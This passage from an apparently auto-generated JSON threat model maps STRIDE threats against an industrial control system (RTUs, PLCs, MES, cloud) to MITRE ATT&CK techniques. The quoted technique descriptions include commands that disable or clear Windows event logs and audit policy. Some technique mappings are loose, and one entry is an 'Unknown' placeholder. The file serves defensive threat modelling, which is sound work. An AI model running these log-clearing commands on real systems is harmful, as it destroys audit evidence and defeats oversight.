            "Scenario": "An attacker spoofs the identity of the Control Center to issue unauthorized control commands to RTUs.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept and analyze network traffic between the Control Center and RTUs.",
                    "Role": "Attacker",
                    "Condition": "Network sniffing capabilities"
                },
                {
                    "Assumption": "There are no additional verification mechanisms for control commands at the RTUs.",
                    "Role": "System Design",
                    "Condition": "Lack of command verification"
                },
                {
                    "Assumption": "Encryption is not robust or properly implemented for network communication.",
                    "Role": "Encryption Implementation",
                    "Condition": "Weak or improper encryption"
                }
            ],
            "Potential Impact": "Disruption of industrial processes, potential compromise of operational data integrity.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "control center",
                "command injection",
                "network sniffing"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses social engineering to obtain legitimate credentials of a cloud service account.",
            "Assumptions": [
                {
                    "Assumption": "Users are susceptible to social engineering attacks.",
                    "Role": "User",
                    "Condition": "Lack of training or awareness"
                },
                {
                    "Assumption": "Multi-factor authentication is not enforced for cloud services.",
                    "Role": "System Policy",
                    "Condition": "No MFA"
                },
                {
                    "Assumption": "Attackers can create realistic phishing emails or messages.",
                    "Role": "Attacker",
                    "Condition": "Phishing capabilities"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data stored in the cloud, potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "social engineering",
                "phishing",
                "cloud services"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.\n\nAdversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an \"IDN homograph attack\").(Citation: CISA IDN ST05-016) URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)\n\nAdversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: Trend Micro Pawn Storm OAuth 2017) These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. (Citation: Microsoft OAuth 2.0 Consent Phishing 2021)\n\nAdversaries may also utilize spearphishing links to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s that grant immediate access to the victim environment. For example, a user may be lured through \u201cconsent phishing\u201d into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .(Citation: Trend Micro Pawn Storm OAuth 2017)(Citation: Microsoft OAuth 2.0 Consent Phishing 2021)\n\nSimilarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as \u201cdevice code phishing,\u201d an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.(Citation: SecureWorks Device Code Phishing 2021)(Citation: Netskope Device Code Phishing 2021)(Citation: Optiv Device Code Phishing 2021)",
                "id": "attack-pattern--2b742742-28c3-4e1b-bab7-8350d6300fa7",
                "technique_id": "T1566.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies control commands sent from the Control Center to RTUs.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept and alter network traffic.",
                    "Role": "Attacker",
                    "Condition": "Network access"
                },
                {
                    "Assumption": "Control commands are not cryptographically signed.",
                    "Role": "System Design",
                    "Condition": "Lack of signing"
                },
                {
                    "Assumption": "System does not verify the integrity of received commands.",
                    "Role": "RTUs",
                    "Condition": "No integrity checks"
                }
            ],
            "Potential Impact": "Altered control of industrial processes leading to potential hazards or operational failures.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "control commands",
                "network",
                "integrity"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters data collected by field devices before it reaches the gateway.",
            "Assumptions": [
                {
                    "Assumption": "Field devices and the gateway communicate over an insecure network.",
                    "Role": "System Design",
                    "Condition": "Insecure communication"
                },
                {
                    "Assumption": "The system does not use end-to-end encryption.",
                    "Role": "Encryption Policy",
                    "Condition": "No end-to-end encryption"
                },
                {
                    "Assumption": "Attackers have physical or logical access to tamper with data streams.",
                    "Role": "Attacker",
                    "Condition": "Data stream access"
                }
            ],
            "Potential Impact": "Falsified data leading to incorrect analytics and potentially faulty operational decisions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data integrity",
                "field devices",
                "gateway"
            ],
            "mitre_technique": {
                "name": "Alarm Suppression",
                "description": "Adversaries may target protection function alarms to prevent them from notifying operators of critical conditions. Alarm messages may be a part of an overall reporting system and of particular interest for adversaries. Disruption of the alarm system does not imply the disruption of the reporting system as a whole.\n\nA Secura presentation on targeting OT notes a dual fold goal for adversaries attempting alarm suppression: prevent outgoing alarms from being raised and prevent incoming alarms from being responded to. (Citation: Jos Wetzels, Marina Krotofil 2019) The method of suppression may greatly depend on the type of alarm in question:  \n\n* An alarm raised by a protocol message \n* An alarm signaled with I/O \n* An alarm bit set in a flag (and read) \n\nIn ICS environments, the adversary may have to suppress or contend with multiple alarms and/or alarm propagation to achieve a specific goal to evade detection or prevent intended responses from occurring. (Citation: Jos Wetzels, Marina Krotofil 2019)  Methods of suppression may involve tampering or altering device displays and logs, modifying in memory code to fixed values, or even tampering with assembly level instruction code.",
                "id": "attack-pattern--2900bbd8-308a-4274-b074-5b8bde8347bc",
                "technique_id": "T0878"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies software updates sent over the network to PLCs.",
            "Assumptions": [
                {
                    "Assumption": "Software updates are not cryptographically signed or verified.",
                    "Role": "System Design",
                    "Condition": "Lack of signing"
                },
                {
                    "Assumption": "The attacker has access to the update distribution network.",
                    "Role": "Attacker",
                    "Condition": "Network access"
                },
                {
                    "Assumption": "Update channels are not secured with proper encryption.",
                    "Role": "Encryption Policy",
                    "Condition": "No encryption"
                }
            ],
            "Potential Impact": "Deployment of malicious code potentially leading to control system compromise.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "software updates",
                "integrity",
                "PLCs"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292",
                "technique_id": "T1565.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An employee disputes issuing a command that led to a manufacturing fault.",
            "Assumptions": [
                {
                    "Assumption": "The system does not utilize comprehensive logging mechanisms.",
                    "Role": "System Design",
                    "Condition": "Lack of logging"
                },
                {
                    "Assumption": "There is no non-repudiation measure for actions taken by users.",
                    "Role": "Authentication Policy",
                    "Condition": "No non-repudiation"
                },
                {
                    "Assumption": "User actions are not linked to unique, unalterable identifiers.",
                    "Role": "User Management",
                    "Condition": "No unique identifiers"
                }
            ],
            "Potential Impact": "Difficulty in incident investigation and accountability, potential operational damage.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "non-repudiation",
                "user actions"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker deletes or alters logs to cover their tracks after an unauthorized access incident.",
            "Assumptions": [
                {
                    "Assumption": "Logs are stored without secure access controls.",
                    "Role": "System Design",
                    "Condition": "Weak access controls"
                },
                {
                    "Assumption": "Log integrity is not protected by cryptographic techniques.",
                    "Role": "Security Policy",
                    "Condition": "No log integrity measures"
                },
                {
                    "Assumption": "The attacker has elevated privileges or exploited a vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Elevated access"
                }
            ],
            "Potential Impact": "Loss of critical forensic data, difficulty in assessing the extent and impact of the attack.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log tampering",
                "forensic",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Indicator Removal",
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
                "technique_id": "T1070"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "System administrators are unable to trace back changes in configuration settings to specific individuals.",
            "Assumptions": [
                {
                    "Assumption": "Configuration changes are not logged or attributed to user accounts.",
                    "Role": "System Policy",
                    "Condition": "No accountability for changes"
                },
                {
                    "Assumption": "There are no mechanisms for preventing the modification of log entries.",
                    "Role": "Security Policy",
                    "Condition": "No log modification safeguards"
                },
                {
                    "Assumption": "Multiple administrators share accounts or credentials.",
                    "Role": "User Management",
                    "Condition": "Shared credentials"
                }
            ],
            "Potential Impact": "Inability to hold individuals accountable for actions, leading to operational risks.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "configuration changes",
                "accountability",
                "logging"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data is exposed due to insecure communication between the Control Center and cloud services.",
            "Assumptions": [
                {
                    "Assumption": "The communication channels are not encrypted.",
                    "Role": "System Design",
                    "Condition": "Insecure communication"
                },
                {
                    "Assumption": "Sensitive data is transmitted without proper obfuscation.",
                    "Role": "Data Handling Policy",
                    "Condition": "No data obfuscation"
                },
                {
                    "Assumption": "The attacker can intercept network traffic.",
                    "Role": "Attacker",
                    "Condition": "Network access"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive operational data, potential data breach.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data breach",
                "network interception",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains access to cloud storage and extracts sensitive manufacturing data.",
            "Assumptions": [
                {
                    "Assumption": "The cloud storage system has weak access controls.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Weak access management"
                },
                {
                    "Assumption": "Sensitive data in the cloud is not properly encrypted.",
                    "Role": "Data Handling Policy",
                    "Condition": "Lack of encryption"
                },
                {
                    "Assumption": "The attacker can escalate privileges within the cloud environment.",
                    "Role": "Attacker",
                    "Condition": "Privilege escalation"
                }
            ],
            "Potential Impact": "Exposure of sensitive manufacturing data, leading to potential industrial espionage or competitive disadvantage.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud storage",
                "data extraction",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An insider leaks sensitive production workflows from the MES database.",
            "Assumptions": [
                {
                    "Assumption": "Insider has legitimate access to the MES database.",
                    "Role": "Insider",
                    "Condition": "Authorized access"
                },
                {
                    "Assumption": "Sensitive data is not adequately protected within the database.",
                    "Role": "Data Handling Policy",
                    "Condition": "Inadequate data protection"
                },
                {
                    "Assumption": "There are no monitoring mechanisms to detect data exfiltration.",
                    "Role": "Security Monitoring",
                    "Condition": "No monitoring"
                }
            ],
            "Potential Impact": "Leak of sensitive production workflows compromising competitive edge and intellectual property.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "insider threat",
                "MES database",
                "data leak"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a DDoS attack against the Control Center's HMI, disrupting monitoring operations.",
            "Assumptions": [
                {
                    "Assumption": "The Control Center is susceptible to high network traffic volume.",
                    "Role": "System Design",
                    "Condition": "Network vulnerability"
                },
                {
                    "Assumption": "Adequate DDoS mitigation measures are not in place.",
                    "Role": "Security Measures",
                    "Condition": "Lack of DDoS protection"
                },
                {
                    "Assumption": "The attacker has the resources to launch a large-scale DDoS attack.",
                    "Role": "Attacker",
                    "Condition": "DDoS capabilities"
                }
            ],
            "Potential Impact": "Monitoring operations are disrupted, leading to potential operational hazards.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "HMI",
                "monitoring disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A malware infects the gateway, overloading its processing capabilities and preventing data transmission.",
            "Assumptions": [
                {
                    "Assumption": "The gateway does not have robust anti-malware protections.",
                    "Role": "System Design",
                    "Condition": "Lack of anti-malware"
                },
                {
                    "Assumption": "The attacker can infect the gateway through known vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Exploitable vulnerabilities"
                },
                {
                    "Assumption": "There are no incident response mechanisms for malware infection.",
                    "Role": "Incident Response Team",
                    "Condition": "No response mechanisms"
                }
            ],
            "Potential Impact": "Disruption of data transmission affecting real-time data processing and industrial operations.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "gateway",
                "data transmission"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits vulnerabilities in cloud services to render them unavailable for industrial operations.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services have known unpatched vulnerabilities.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Unpatched vulnerabilities"
                },
                {
                    "Assumption": "The attacker has the capability to exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Exploitation capabilities"
                },
                {
                    "Assumption": "No adequate fallback mechanisms are in place for cloud service failures.",
                    "Role": "System Design",
                    "Condition": "Lack of fallback mechanisms"
                }
            ],
            "Potential Impact": "Industrial operations are disrupted due to unavailability of critical cloud services.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "cloud services",
                "vulnerabilities",
                "industrial operations"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
